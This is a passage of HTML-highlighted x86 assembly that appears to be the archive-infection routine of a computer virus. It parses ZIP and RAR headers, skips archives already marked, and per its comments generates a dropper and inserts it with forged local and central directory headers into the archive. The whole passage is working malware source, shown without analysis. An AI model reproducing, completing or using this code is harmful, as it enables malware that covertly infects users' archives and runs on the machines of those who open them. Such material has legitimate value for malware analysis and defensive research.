        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ESI</span><span class="sc0">
        </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc5">OUR_RAR_FHEADER.RAR_HOST_OS</span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc4">,[</span><span class="sc5">ESI.RAR_HOST_OS</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">-</span><span class="sc5">RAR_HOST_OS</span><span class="sc4">+</span><span class="sc5">RAR_F_HEAD_TYPE</span><span class="sc4">],</span><span class="sc5">RAR_FILE_SIGN</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">-</span><span class="sc5">RAR_HOST_OS</span><span class="sc4">+</span><span class="sc5">RAR_F_HEAD_FLAGS</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">80H</span><span class="sc0">
        </span><span class="sc6">MOVSB</span><span class="sc0">
        </span><span class="sc6">CMPSD</span><span class="sc0">
        </span><span class="sc6">MOVSD</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">DL</span><span class="sc0">
        </span><span class="sc6">MOVSB</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc5">RAR_STORED</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc8">ECX</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc9">SIZE</span><span class="sc0"> </span><span class="sc5">RAR_FILE_HDR</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">-</span><span class="sc5">RAR_FILE_ATTRIB</span><span class="sc4">+</span><span class="sc5">RAR_F_HEAD_SIZE</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc0">
</span><span class="sc5">SKIP_EXE_RAR</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">MOVZX</span><span class="sc0">   </span><span class="sc8">EAX</span><span class="sc4">,[</span><span class="sc5">ESI.RAR_F_HEAD_SIZE</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,[</span><span class="sc5">ESI.RAR_COMPRESSED_SIZE</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">READ_RAR_FH</span><span class="sc0">
</span><span class="sc5">RAR_DONE</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">CHECK_ARCOUNT</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">GO_EXIT_ZIP_TOP</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ESI</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc0">
        </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc5">OUR_RAR_FHEADER</span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc4">]+</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ESI.RAR_COMPRESSED_SIZE</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ECX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ESI.RAR_ORIGINAL_SIZE</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ECX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ESI.RAR_CRC32</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,[</span><span class="sc5">ESI.RAR_F_HEAD_SIZE</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc0">
        </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_CRC32</span><span class="sc0">
        </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc0">
        </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">ZIP1_INSERT_FILE</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc0">
</span><span class="sc5">GO_EXIT_ZIP_TOP</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">EXIT_ZIP_TOP</span><span class="sc0">
</span><span class="sc5">SET_INSERT</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">SET_DATE</span><span class="sc0">

</span><span class="sc1">;------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;ENTRY: ESI=DATA FOR WRITE,ECX=SIZEOF(ESI),EAX=POS IN FILE</span><span class="sc0">
</span><span class="sc5">ZIP1_INSERT_FILE</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc5">ZIP_CUR_OFF</span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">ZIP_INSERT_FILE</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc5">ZIP_CENTRAL_OFF</span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc4">],</span><span class="sc8">ECX</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc5">ZIP_CUR_OFF</span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc4">],</span><span class="sc8">ECX</span><span class="sc0">
</span><span class="sc5">INSERT_FILE</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ESI</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GETSIZE_FILE</span><span class="sc0">
        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc5">LEN_IOBUFF</span><span class="sc0">
</span><span class="sc5">INSERT_NEXT</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc8">ECX</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc4">,[</span><span class="sc8">ESP</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">JAE</span><span class="sc0"> </span><span class="sc5">FULL_INSBUFF</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc8">EDI</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc4">,[</span><span class="sc8">ESP</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc8">EDI</span><span class="sc0">
</span><span class="sc5">FULL_INSBUFF</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc5">INSERT_BUFF</span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc8">EDI</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">READ_FILE</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">INS_POP</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,[</span><span class="sc8">ESP</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc8">EDI</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">WRITE_FILE</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">INS_POP</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc4">,[</span><span class="sc8">ESP</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">INSERT_NEXT</span><span class="sc0">
</span><span class="sc5">INS_POP</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc0">
        </span><span class="sc6">JNB</span><span class="sc0"> </span><span class="sc5">WRITE_FILE</span><span class="sc0">
</span><span class="sc5">EXIT_ZIP_TOP</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">RET</span><span class="sc0">

</span><span class="sc1">;------------------------------------------------</span><span class="sc0">
        </span><span class="sc5">GOFF</span><span class="sc0">    </span><span class="sc5">INF_ZIP</span><span class="sc0">
</span><span class="sc1">;1. FIND CENTRAL AREA</span><span class="sc0">
</span><span class="sc5">FIND_ZCENTRAL</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ESI.ZIP_LOC_SIGN_</span><span class="sc4">],</span><span class="sc5">ZIP_LOCAL_SIGN</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">EXIT_ZIP_TOP</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc9">SIZE</span><span class="sc0"> </span><span class="sc5">ZIP_CENTRAL_HEADER</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc9">SIZE</span><span class="sc0"> </span><span class="sc5">ZIP_LOCAL_HEADER</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,[</span><span class="sc5">ESI.ZIP_COMPRESSED_SIZE</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,[</span><span class="sc5">ESI.ZIP_SIZE_FNAME</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,[</span><span class="sc5">ESI.ZIP_EXTRA_FIELD_LENGTH</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">ZIP_READ_FILE</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">EXIT_ZIP_TOP</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ESI.ZIP_CENTR_SIGN_</span><span class="sc4">],</span><span class="sc5">ZIP_CENTRAL_SIGN</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">FIND_ZCENTRAL</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc5">ZIP_CUR_OFF</span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc5">ZIP_CENTRAL_OFF</span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">;2. FIND END HEADER AND CHECK FILE COUNTER (AND IF EXECUTABLE FILE PRESENT)</span><span class="sc0">
</span><span class="sc5">FIND_ZEND</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ESI.ZIP_EXTRNL_FILE_ATTR_</span><span class="sc4">],</span><span class="sc5">FA_DIRECTORY</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">SKIP_EXE_TEST</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc5">ZIP_FILE_COUNTER</span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ESI.ZIP_FILE_TIME_</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">CONT_CHECK</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,[</span><span class="sc5">ESI.ZIP_COMPRESSION_METHOD_</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">EXIT_ZIP_TOP</span><span class="sc0">
</span><span class="sc5">CONT_CHECK</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,[</span><span class="sc5">ESI.ZIP_SIZE_FNAME_</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc5">OUR_LOCAL_HEADER.ZIP_LOCAL_FNAME</span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ESI</span><span class="sc0"> </span><span class="sc10">LARGE</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc5">ZIP_CENTRAL_FNAME</span><span class="sc0"> </span><span class="sc10">LARGE</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc12">'/'</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">TEST_EXEC</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">SKIP_EXE_TEST_POP</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">OUR_LOCAL_HEADER.ZIP_SIZE_FNAME</span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc4">],</span><span class="sc8">CX</span><span class="sc0">
        </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc5">OUR_CENTRAL_HEADER.ZIP_CENTRAL_FNAME</span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">OUR_CENTRAL_HEADER.ZIP_SIZE_FNAME_</span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc4">],</span><span class="sc8">CX</span><span class="sc0">
        </span><span class="sc6">REP</span><span class="sc0"> </span><span class="sc6">MOVSB</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc0">
        </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc5">OUR_LOCAL_HEADER</span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc5">ZIP_LOCAL_SIGN</span><span class="sc0">
        </span><span class="sc6">STOSD</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ESI.ZIP_VER_NED_TO_EXTR</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">STOSD</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ESI.ZIP_FILE_TIME_</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">
        </span><span class="sc6">STOSD</span><span class="sc0">
        </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc5">OUR_CENTRAL_HEADER</span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ESI</span><span class="sc0">
        </span><span class="sc6">MOVSD</span><span class="sc0">
        </span><span class="sc6">MOVSD</span><span class="sc0">
        </span><span class="sc6">MOVSD</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">CX</span><span class="sc0">
        </span><span class="sc6">MOVSD</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">CL</span><span class="sc0">
</span><span class="sc5">SKIP_EXE_TEST_POP</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc0">
</span><span class="sc5">SKIP_EXE_TEST</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc9">SIZE</span><span class="sc0"> </span><span class="sc5">ZIP_CENTRAL_HEADER</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc8">ECX</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,[</span><span class="sc5">ESI.ZIP_SIZE_FNAME_</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,[</span><span class="sc5">ESI.ZIP_EXTRA_FIELD_LENGTH_</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,[</span><span class="sc5">ESI.ZIP_FILE_COMMENT_LENGTH_</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">ZIP_READ_FILE</span><span class="sc0">
        </span><span class="sc6">JNB</span><span class="sc0"> </span><span class="sc5">ZIP_READ_OK</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">
        </span><span class="sc6">JS</span><span class="sc0">  </span><span class="sc5">ZIP_READ_OK</span><span class="sc0">
</span><span class="sc5">EXIT_ZIP</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">RETN</span><span class="sc0">
</span><span class="sc5">ZIP_READ_OK</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ESI.ZIP_CENTR_SIGN_</span><span class="sc4">],</span><span class="sc5">ZIP_CENTRAL_SIGN</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">FIND_ZEND</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ESI.ZIP_END_SIGN_</span><span class="sc4">],</span><span class="sc5">ZIP_END_SIGN</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">EXIT_ZIP</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">CHECK_ARCOUNT</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">EXIT_ZIP</span><span class="sc0">
</span><span class="sc1">;3. GENERATE DROPPER AND INSERT LOCAL HEADER+DROPPER AT ZIP_CENTRAL_OFF</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ESI</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc0">
        </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc5">OUR_LOCAL_HEADER</span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ESI.ZIP_CRC_32</span><span class="sc4">],</span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ESI.ZIP_COMPRESSED_SIZE</span><span class="sc4">],</span><span class="sc8">ECX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ESI.ZIP_UNCOMPRESSED_SIZE</span><span class="sc4">],</span><span class="sc8">ECX</span><span class="sc0">
        </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc5">OUR_CENTRAL_HEADER</span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">EDI.ZIP_CRC_32_</span><span class="sc4">],</span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">EDI.ZIP_COMPRESSED_SIZE_</span><span class="sc4">],</span><span class="sc8">ECX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">EDI.ZIP_UNCOMPRESSED_SIZE_</span><span class="sc4">],</span><span class="sc8">ECX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc5">ZIP_CENTRAL_OFF</span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">EDI.ZIP_REL_OFF_OF_LOC_HDR_</span><span class="sc4">],</span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc9">SIZE</span><span class="sc0"> </span><span class="sc5">ZIP_LOCAL_HEADER</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,[</span><span class="sc5">ESI.ZIP_SIZE_FNAME</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">ZIP_INSERT_FILE</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">EXIT_ZIP</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc5">ZIP_CENTRAL_OFF</span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">ZIP_INSERT_FILE</span><span class="sc0">
</span><span class="sc5">GO_EXIT_ZIP</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">EXIT_ZIP</span><span class="sc0">
</span><span class="sc1">;4. INSERT CENTRAL HEADER AT ZIP_CUR_OFF (ZIP_END_OFF)</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc8">EDI</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc9">SIZE</span><span class="sc0"> </span><span class="sc5">ZIP_CENTRAL_HEADER</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,[</span><span class="sc5">ESI.ZIP_SIZE_FNAME_</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc5">ZIP_CENTRAL_OFF</span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">ZIP1_INSERT_FILE</span><span class="sc0">
        </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc5">BUFF_ZIP_HEADER</span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ESI.OFF_OF_STRT_OF_CENT_DIRECTORY</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">GO_EXIT_ZIP</span><span class="sc0">
</span><span class="sc1">;5. WRITE END HEADER AT ZIP_CUR_OFF (NEW ZIP_END_OFF)</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ESI.SIZE_OF_THE_CENTRAL_DIRECTORY</span><span class="sc4">],</span><span class="sc8">ECX</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ESI.TTL_NUM_OF_ENT_ON_THIS_DISK</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ESI.TTL_NUM_OF_ENT_IN_THE_CENT_DIR</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc9">SIZE</span><span class="sc0"> </span><span class="sc5">ZIP_END_HEADER</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc0">
